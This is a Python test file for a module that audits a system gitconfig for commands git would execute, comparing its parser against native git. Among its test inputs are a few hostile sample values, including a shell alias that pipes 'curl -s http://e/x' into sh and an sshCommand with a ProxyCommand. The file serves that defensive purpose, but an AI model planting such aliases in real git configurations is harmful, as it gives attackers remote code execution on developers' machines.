"""Tests for the pure system gitconfig execution contract (#1535)."""
from __future__ import annotations

import os
import pty
import shutil
import subprocess
import tempfile
import unittest

from app import git_system_config as gc

SYS = gc.SYSTEM_PATH


def assess(text, **extra):
    return gc.assess_system_gitconfig({SYS: text, **extra})


def runs(result):
    return [(e['kind'], e['command']) for e in result['executions']]


# Inputs compared against native ``git config --list`` byte for byte.
DIFFERENTIAL_CORPUS = [
    '[core]\n\tpager = less  -R\t x  # c\n\tEditor = "vim ; x"  ; trailing\n',
    '[alias "Foo"]\n\tx = 1\n[alias.Bar]\n\ty = 2\n',
    '[credential]\n\thelper = store\n\thelper =\n\thelper = !f() { echo hi; }; f\n',
    '[a]\n\tbare\n\tcont = one \\\ntwo\n\tesc = "a\\tb\\\\c\\"d"\n\tempty =\n',
    '[core] pager = x\n[a "b\\"c"]k=1\n',
    '﻿[core]\r\n\tpager = crlf\r\n; comment\r\n# other\r\n',
    '[x]\n\tk = "  quoted  spaces  "  tail\n\tn = a\\nb\n\tq = "#not comment;"\n',
    '[Section-1 "MiXeD Case"]\n\tKey-2 = v\n[s.T.U]\n\tk = v\n',
    '[a]k=1\n[b]k=2 ; c\n',
    'top = before any section\n[a]\n\tk = 1\n',
]
SYNTAX_ERRORS = [
    '[a]\n\tbare # c\n',
    '[a]\n\tk = "open\n',
    '[a]\n\tk = bad\\q\n',
    '[a "x"y]\n\tk = 1\n',
    '[a]\n\t1k = 1\n',
    '[ a]\n',
    '[]\nk=1\n',
    '[a "line\n"]\n',
]


def _native_git():
    git = shutil.which('git')
    if not git:
        return None
    return git


def _git_env(system_file, home):
    env = {k: v for k, v in os.environ.items() if not k.startswith('GIT_')}
    env.update({'GIT_CONFIG_SYSTEM': system_file, 'GIT_CONFIG_GLOBAL': os.devnull, 'HOME': home,
                'GIT_CONFIG_NOSYSTEM': '0', 'LC_ALL': 'C', 'GIT_TERMINAL_PROMPT': '0'})
    return env


class ParserTests(unittest.TestCase):
    def test_names_values_and_bare_keys(self):
        entries = gc.parse_config(DIFFERENTIAL_CORPUS[0] + DIFFERENTIAL_CORPUS[3])
        got = {e['name']: e['value'] for e in entries}
        self.assertEqual(got['core.pager'], 'less  -R  x')
        self.assertEqual(got['core.editor'], 'vim ; x')
        self.assertIsNone(got['a.bare'])
        self.assertEqual(got['a.cont'], 'one two')
        self.assertEqual(got['a.esc'], 'a\tb\\c"d')
        self.assertEqual(got['a.empty'], '')

    def test_inner_whitespace_modes(self):
        text = '[a]\n\tk = x \t y\n'
        self.assertEqual(gc.parse_config(text)[0]['value'], 'x   y')
        self.assertEqual(gc.parse_config(text, inner_whitespace='verbatim')[0]['value'], 'x \t y')
        with self.assertRaises(ValueError):
            gc.parse_config(text, inner_whitespace='other')

    def test_subsection_case_and_legacy_form(self):
        names = [e['name'] for e in gc.parse_config(DIFFERENTIAL_CORPUS[1])]
        self.assertEqual(names, ['alias.Foo.x', 'alias.bar.y'])

    def test_unquoted_semicolon_cuts_a_shell_alias(self):
        entries = gc.parse_config(DIFFERENTIAL_CORPUS[2])
        self.assertEqual(entries[-1]['value'], '!f() { echo hi')

    def test_syntax_errors_raise_with_line(self):
        for text in SYNTAX_ERRORS:
            with self.subTest(text=text):
                with self.assertRaises(ValueError):
                    gc.parse_config(text)


class ContractTests(unittest.TestCase):
    def test_not_observed_and_absent(self):
        self.assertFalse(gc.assess_system_gitconfig(None)['complete'])
        self.assertFalse(gc.assess_system_gitconfig({})['complete'])
        absent = gc.assess_system_gitconfig({SYS: None})
        self.assertTrue(absent['complete'])
        self.assertEqual(absent['executions'], [])
        self.assertEqual(absent['origin'], 'not_assessed')

    def test_shell_alias_pager_editor_and_ssh(self):
        result = assess('[alias]\n\tst = status\n\tx = "!curl -s http://e/x | sh"\n'
                        '[core]\n\tpager = less\n\tpager = /usr/local/bin/p\n\teditor = vi\n'
                        '\tsshCommand = ssh -o ProxyCommand=evil\n')
        self.assertTrue(result['complete'])
        got = {e['kind']: e for e in result['executions']}
        self.assertEqual(got['alias']['command'], 'curl -s http://e/x | sh')
        self.assertEqual(got['alias']['trigger'], 'git x')
        self.assertTrue(got['alias']['via_shell'])
        self.assertEqual(got['pager']['command'], '/usr/local/bin/p')  # last one wins
        self.assertEqual(got['pager']['environment_override'], 'GIT_PAGER')
        self.assertEqual(got['editor']['command'], 'vi')
        self.assertEqual(got['ssh_command']['line'], 8)
        self.assertNotIn(('alias', 'status'), runs(result))
        self.assertTrue(all(e['run_as'] == 'invoking_user' and e['overridable'] for e in result['executions']))

    def test_pager_and_fsmonitor_booleans_start_no_program(self):
        result = assess('[core]\n\tpager = cat\n\tfsmonitor = true\n[pager]\n\tlog = false\n\tdiff = true\n'
                        '\tbranch = less -FRX\n')
        self.assertEqual(runs(result), [('pager', 'less -FRX')])
        self.assertIn('builtin_fsmonitor_daemon', [w['reason'] for w in result['warnings']])
        hook = assess('[core]\n\tfsmonitor = /opt/watch-hook\n')
        self.assertEqual(runs(hook), [('fsmonitor_hook', '/opt/watch-hook')])

    def test_credential_helpers_reset_and_forms(self):
        result = assess('[credential]\n\thelper = cache\n\thelper =\n\thelper = store --file /x\n'
                        '\thelper = /opt/h\n[credential "https://example.com"]\n\thelper = "!f() { cat /x; }; f"\n')
        self.assertEqual([e['command'] for e in result['executions']],
                         ['git credential-store --file /x', '/opt/h', 'f() { cat /x; }; f'])
        self.assertEqual(result['executions'][-1]['url_scope'], 'https://example.com')
        self.assertTrue(all(e['via_shell'] for e in result['executions']))

    def test_drivers_hooks_gpg_and_upload_pack(self):
        result = assess('[diff "pdf"]\n\ttextconv = pdftotext\n[filter "lfs"]\n\tclean = git-lfs clean -- %f\n'
                        '\tprocess = git-lfs filter-process\n[merge "ours"]\n\tdriver = true\n'
                        '[core]\n\thooksPath = /etc/git-hooks\n[gpg]\n\tprogram = /opt/gpg\n'
                        '[uploadpack]\n\tpackObjectsHook = /opt/pack\n')
        kinds = dict(runs(result))
        self.assertEqual(kinds['textconv'], 'pdftotext')
        self.assertEqual(kinds['filter_process'], 'git-lfs filter-process')
        self.assertEqual(kinds['merge_driver'], 'true')
        self.assertEqual(kinds['hooks_path'], '/etc/git-hooks')
        self.assertEqual(kinds['pack_objects_hook'], '/opt/pack')
        gpg = next(e for e in result['executions'] if e['kind'] == 'gpg_program')
        self.assertFalse(gpg['via_shell'])

    def test_relative_conditional_and_missing_includes(self):
        result = gc.assess_system_gitconfig({
            SYS: '[include]\n\tpath = git.d/a\n\tpath = gone\n[includeIf "gitdir:/srv/"]\n\tpath = /etc/c\n',
            '/etc/git.d/a': '[core]\n\tpager = from-a\n',
            '/etc/gone': None,
            '/etc/c': '[core]\n\tpager = from-c\n',
        })
        self.assertTrue(result['complete'])
        pagers = [e for e in result['executions'] if e['kind'] == 'pager']
        self.assertEqual([(p['command'], p['conditional']) for p in pagers],
                         [('from-a', False), ('from-c', True)])
        self.assertEqual(pagers[0]['include_chain'], [SYS])
        self.assertEqual(pagers[1]['condition'], 'gitdir:/srv/')
        self.assertEqual([i['followed'] for i in result['includes']], [True, False, True])

    def test_include_gaps_fail_closed(self):
        for text, reason in (('[include]\n\tpath = ~/.extra\n', 'include_per_user_path'),
                             ('[include]\n\tpath = /etc/uncollected\n', 'include_not_captured'),
                             ('[a]\n\tk = "x\n', 'syntax_error')):
            with self.subTest(reason=reason):
                result = assess(text)
                self.assertFalse(result['complete'])
                self.assertEqual(result['gaps'][0]['reason'], reason)

    def test_include_depth_limit(self):
        files = {SYS: '[include]\n\tpath = /etc/g0\n'}
        for i in range(12):
            files[f'/etc/g{i}'] = f'[include]\n\tpath = /etc/g{i + 1}\n'
        files['/etc/g12'] = '[core]\n\tpager = deep\n'
        result = gc.assess_system_gitconfig(files)
        self.assertFalse(result['complete'])
        self.assertIn('include_depth_exceeded', [g['reason'] for g in result['gaps']])

    def test_include_depth_boundary_matches_git(self):
        # Native git 2.43.0: ten nested includes load, eleven are fatal.
        for nested, complete in ((10, True), (11, False)):
            files = {SYS: '[include]\n\tpath = /etc/g1\n'}
            for i in range(1, nested):
                files[f'/etc/g{i}'] = f'[include]\n\tpath = /etc/g{i + 1}\n'
            files[f'/etc/g{nested}'] = '[a]\n\tk = 1\n'
            with self.subTest(nested=nested):
                self.assertIs(gc.assess_system_gitconfig(files)['complete'], complete)

    def test_alias_global_options_and_ext_transport(self):
        result = assess('[alias]\n\tl = -c core.pager=/tmp/x log\n[protocol "ext"]\n\tallow = always\n')
        self.assertFalse(result['complete'])
        self.assertEqual(result['gaps'][0]['reason'], 'alias_sets_global_options')
        self.assertEqual(result['transport_risks'][0]['reason'], 'ext_transport_enabled')

    def test_oversized_input_and_no_hash_of_raw_text(self):
        self.assertFalse(assess('#' * (gc.MAX_TEXT + 1))['complete'])
        result = assess('[http]\n\textraHeader = Authorization: Bearer secret\n')
        self.assertNotIn('sha256', str(sorted(result)))
        self.assertEqual(result['executions'], [])


@unittest.skipUnless(_native_git(), 'native git is not installed')
class NativeGitTests(unittest.TestCase):
    """Compare with the installed git binary (validated on git 2.43.0)."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp)

    def _list(self, text):
        system = os.path.join(self.tmp, 'gitconfig')
        with open(system, 'w', encoding='utf-8', newline='') as fh:
            fh.write(text)
        return subprocess.run(['git', 'config', '--system', '--list', '-z'], env=_git_env(system, self.tmp),
                              cwd=self.tmp, capture_output=True, check=False)

    def _whitespace_mode(self):
        proc = self._list('[a]\n\tk = x\ty\n')
        return 'verbatim' if proc.stdout == b'a.k\nx\ty\0' else 'space'

    def test_parser_matches_git_config_list(self):
        mode = self._whitespace_mode()
        for text in DIFFERENTIAL_CORPUS:
            with self.subTest(text=text):
                proc = self._list(text)
                self.assertEqual(proc.returncode, 0, proc.stderr)
                native = []
                for item in proc.stdout.decode('utf-8').split('\0')[:-1]:
                    name, sep, value = item.partition('\n')
                    native.append((name, value if sep else None))
                ours = [(e['name'], e['value']) for e in gc.parse_config(text, inner_whitespace=mode)]
                self.assertEqual(ours, native)

    def test_git_rejects_what_the_parser_rejects(self):
        for text in SYNTAX_ERRORS:
            with self.subTest(text=text):
                self.assertNotEqual(self._list(text).returncode, 0)

    def test_include_resolution_matches_git(self):
        etc = os.path.join(self.tmp, 'etc')
        os.makedirs(os.path.join(etc, 'git.d'))
        system = os.path.join(etc, 'gitconfig')
        files = {system: '[core]\n\tpager = first\n[include]\n\tpath = git.d/a\n\tpath = gone\n[x]\n\tk = after\n',
                 os.path.join(etc, 'git.d', 'a'): '[core]\n\tpager = from-a\n[include]\n\tpath = b\n',
                 os.path.join(etc, 'git.d', 'b'): '[core]\n\teditor = from-b\n',
                 os.path.join(etc, 'gone'): None}
        for name, text in files.items():
            if text is not None:
                with open(name, 'w', encoding='utf-8') as fh:
                    fh.write(text)
        proc = subprocess.run(['git', 'config', '--system', '--includes', '--list', '-z'],
                              env=_git_env(system, self.tmp), cwd=self.tmp, capture_output=True, check=True)
        native = [tuple(item.split('\n', 1)) for item in proc.stdout.decode().split('\0')[:-1]]
        result = gc.assess_system_gitconfig(files, path=system)
        self.assertTrue(result['complete'])
        self.assertEqual([(e['name'], e['value']) for e in result['entries']], native)
        self.assertEqual([e['command'] for e in result['executions'] if e['kind'] == 'pager'], ['from-a'])

    def test_include_depth_limit_is_fatal_in_git(self):
        system = os.path.join(self.tmp, 'gitconfig')
        files = {system: '[include]\n\tpath = g0\n'}
        for i in range(12):
            files[os.path.join(self.tmp, f'g{i}')] = f'[include]\n\tpath = g{i + 1}\n'
        files[os.path.join(self.tmp, 'g12')] = '[a]\n\tk = 1\n'
        for name, text in files.items():
            with open(name, 'w', encoding='utf-8') as fh:
                fh.write(text)
        proc = subprocess.run(['git', 'config', '--system', '--includes', '--list'],
                              env=_git_env(system, self.tmp), cwd=self.tmp, capture_output=True, check=False)
        self.assertNotEqual(proc.returncode, 0)
        self.assertFalse(gc.assess_system_gitconfig(files, path=system)['complete'])

    def test_system_alias_pager_and_helper_actually_run(self):
        marks = os.path.join(self.tmp, 'marks')
        system = os.path.join(self.tmp, 'gitconfig')
        text = (f'[alias]\n\tprobe = "!echo alias >> {marks}"\n'
                f'[core]\n\tpager = "echo pager >> {marks}; cat >/dev/null"\n'
                f'[credential]\n\thelper = "!f() {{ echo helper-$1 >> {marks}; }}; f"\n')
        with open(system, 'w', encoding='utf-8') as fh:
            fh.write(text)
        env = _git_env(system, self.tmp)
        subprocess.run(['git', 'probe'], env=env, cwd=self.tmp, check=True, capture_output=True)
        # git starts a pager only when stdout is a terminal.
        primary, secondary = pty.openpty()
        try:
            subprocess.run(['git', '-p', 'version'], env=env, cwd=self.tmp, check=True,
                           stdout=secondary, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        finally:
            os.close(secondary)
            os.close(primary)
        subprocess.run(['git', 'credential', 'fill'], env=env, cwd=self.tmp, capture_output=True,
                       input=b'protocol=https\nhost=example.invalid\n\n', check=False)
        with open(marks, encoding='utf-8') as fh:
            self.assertEqual(fh.read().split(), ['alias', 'pager', 'helper-get'])
        result = gc.assess_system_gitconfig({SYS: text})
        self.assertEqual([e['kind'] for e in result['executions']], ['pager', 'alias', 'credential_helper'])
        self.assertTrue(result['complete'])


if __name__ == '__main__':
    unittest.main()
